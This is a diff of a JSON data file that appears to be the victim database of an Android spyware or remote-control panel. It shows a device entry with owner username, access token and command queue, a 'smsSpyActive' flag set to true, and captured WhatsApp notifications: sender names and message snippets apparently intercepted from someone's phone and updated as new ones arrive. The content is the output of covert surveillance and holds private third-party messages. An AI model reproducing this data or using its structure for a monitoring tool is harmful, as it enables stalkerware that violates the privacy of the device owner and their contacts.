@@ -108,7 +108,7 @@
     "deviceName": "HP-RASKA321-52A8",
     "ownerUsername": "Amsal.sim",
     "token": "906fc9b5e5fd7ed9167409d9979fb58b",
-    "lastSeen": 1776003697432,
+    "lastSeen": 1776003703849,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T16:02:07.690Z",
@@ -124,6 +124,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨: ~ ~`lova",
+        "content": "💟 Stiker",
+        "time": "12/04 21:21",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003704938
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "𝗬𝗨𝗞𝗜 𝗦𝗧𝗢𝗥𝗘",
+        "content": "‎3 pesan baru",
+        "time": "12/04 21:21",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003701293
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎𝗬𝗨𝗞𝗜 𝗦𝗧𝗢𝗥𝗘 (3 pesan): Membalas Anda",
@@ -4107,22 +4123,6 @@
         "time": "12/04 08:34",
         "pkg": "com.whatsapp",
         "receivedAt": 1775957658044
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝐑𝐀𝐑 𝐎𝐏𝐌𝐄𝐌: ~ 𝐂𝐈𝐓𝐄𝐍𝟗renz'",
-        "content": "intro pm",
-        "time": "12/04 08:34",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775957658037
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎2 pesan baru",
-        "time": "12/04 08:33",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775957598168
       }
     ],
     "galleryPhotos": [],
